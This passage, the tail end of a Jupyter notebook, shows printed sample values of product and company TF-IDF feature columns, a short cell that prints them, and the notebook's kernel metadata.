      "Product_tfidf_38               ['nan', '0', '0.6805160746571647', '1', '0.5773502691896257', '0.0']\n",
      "Product_tfidf_39               ['0.6808088232789354', 'nan', '0', '0.8880090184554797', '1', '0.0']\n",
      "Product_tfidf_40               ['nan', '0.4649549654262759', '0', '0.8891048727479495', '0.5', '1', '0.0']\n",
      "Product_tfidf_41               ['nan', '0', '0.6073792273034763', '0.5', '1', '0.0', '0.4596579412722459']\n",
      "Product_tfidf_42               ['nan', '0.7071067811865476', '0', '0.6073792273034763', '1', '0.0']\n",
      "Product_tfidf_43               ['nan', '0', '1.0', '1', '0.0']\n",
      "Product_tfidf_44               ['nan', '0.5604904296174216', '0', '0.6875862718498964', '0.6779073259514095', '1', '0.0']\n",
      "Product_tfidf_45               ['nan', '0.659017127991646', '0', '0.691563783358511', '0.633759083279549', '1', '0.699357678641707', '0.0']\n",
      "Product_tfidf_46               ['nan', '0', '1', '0.7147718778217867', '0.7223153975562631', '0.0']\n",
      "Product_tfidf_47               ['nan', '0.5000527815684143', '0', '1', '0.5019290340713988', '0.0', '0.2173437588562746', '0.1646642872225137', '0.3206543558047654']\n",
      "Product_tfidf_48               ['nan', '0', '0.5', '1', '0.5773502691896257', '0.0', '0.4596579412722459']\n",
      "Product_tfidf_49               ['nan', '0.4649549654262759', '0.625074854460168', '0', '0.5', '1', '0.0']\n",
      "Product_tfidf_50               ['nan', '0.6657866197133253', '0', '1', '0.5773502691896257', '0.0']\n",
      "Product_tfidf_51               ['nan', '0.6446662522717875', '0', '1', '0.7071067811865475', '0.0']\n",
      "Product_tfidf_52               ['0.4472135954999579', 'nan', '0', '0.6647606274351031', '1', '0.0']\n",
      "Product_tfidf_53               ['nan', '0', '0.6875862718498964', '1', '0.7071067811865475', '0.0']\n",
      "Product_tfidf_54               ['0.4472135954999579', 'nan', '0', '1', '0.0']\n",
      "Product_tfidf_55               ['nan', '0.5604904296174216', '0', '0.6779073259514095', '1', '0.0', '0.8277491729117571']\n",
      "Product_tfidf_56               ['0.4472135954999579', '0.5481700629307155', '0.3406343078450998', 'nan', '0', '0.5118275641694559', '0.7714577013168424', '1', '0.0']\n",
      "Product_tfidf_57               ['nan', '0.2746260666860264', '0', '0.8270271038722535', '1', '0.0', '0.5008457656395496']\n",
      "Product_tfidf_58               ['nan', '0.5048591735206234', '0', '1.0', '1', '0.0']\n",
      "Product_tfidf_59               ['nan', '0.4851305440149274', '0.3083384533613093', '0', '0.4688576902270013', '1', '0.5773502691896257', '0.0', '0.5059194796117918']\n",
      "Product_tfidf_60               ['nan', '0', '0.2251534049094572', '1', '0.0', '0.5019724932418388', '0.6605599476342134']\n",
      "Company_tfidf_12               ['nan', '0', '0.4508720695764156', '0.3338793696181397', '1', '0.0']\n",
      "Company_tfidf_13               ['nan', '0.7071067811865476', '0', '1', '0.7071067811865475', '0.0']\n",
      "Company_tfidf_14               ['0.4472135954999579', 'nan', '0.3067269666476378', '0.7072976054025438', '0', '1', '0.0']\n",
      "Company_tfidf_15               ['nan', '0.7020554211102584', '0', '0.4508720695764156', '1.0', '1', '0.0', '0.2382962006335987']\n",
      "Company_tfidf_16               ['nan', '0.9267230512091212', '0.4322701788274544', '0', '0.6677587392362795', '1', '0.0']\n",
      "Company_tfidf_17               ['0.4472135954999579', 'nan', '0', '0.6540559179801269', '1', '0.0']\n",
      "Company_tfidf_18               ['0.4472135954999579', 'nan', '0', '1', '0.7071067811865475', '0.0']\n",
      "Company_tfidf_19               ['nan', '0', '0.3338793696181397', '0.5743767020897188', '0.5348882388663887', '1', '0.0']\n",
      "Company_tfidf_20               ['nan', '0', '1.0', '0.3338793696181397', '1', '0.0']\n",
      "Company_tfidf_21               ['nan', '0', '0.5', '0.8164965809277259', '1', '0.0']\n",
      "Company_tfidf_22               ['nan', '0', '0.6540559179801269', '1', '0.4082482904638629', '0.0']\n",
      "Unnamed: 0                     ['1716829', '533069', '209475', '982169', '450351', '860392', '231405', '286696', '1559146', '1180930']\n",
      "Product_tfidf_61               ['nan', '0', '1.0', '1', '0.0']\n",
      "Product_tfidf_62               ['nan', '0', '1', '0.5773502691896257', '0.0']\n",
      "Product_tfidf_63               ['nan', '0', '1', '0.6600647724199762', '0.0']\n",
      "Company_tfidf_23               ['nan', '0', '1', '0.7071067811865475', '0.0']\n",
      "Company_tfidf_24               ['nan', '0', '0.5743767020897188', '0.5348882388663887', '1', '0.0']\n",
      "Company_tfidf_25               ['nan', '0.7071067811865476', '0', '1', '0.0']\n",
      "Company_tfidf_26               ['nan', '0', '1.0', '1', '0.0']\n",
      "Company_tfidf_27               ['nan', '0', '1.0', '1', '0.8538231026542452', '0.0']\n",
      "Company_tfidf_28               ['nan', '0.3338793696181397', '0', '1', '0.0']\n",
      "Company_tfidf_29               ['nan', '0', '0.5', '1', '0.0']\n",
      "Company_tfidf_30               ['nan', '0', '0.5', '1', '0.0']\n",
      "Company_tfidf_31               ['nan', '0', '0.3289324130382244', '1', '0.2969208395953486', '0.0']\n"
     ]
    }
   ],
   "source": [
    "column_width = 30\n",
    "for i, j in unique_counts_processed.items():\n",
    "    print(f\"{i.ljust(column_width)} {j}\")\n",
    "print('\\n\\n\\n')\n",
    "for i, j in first_10_unique_values_processed.items():\n",
    "    print(f\"{i.ljust(column_width)} {j}\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
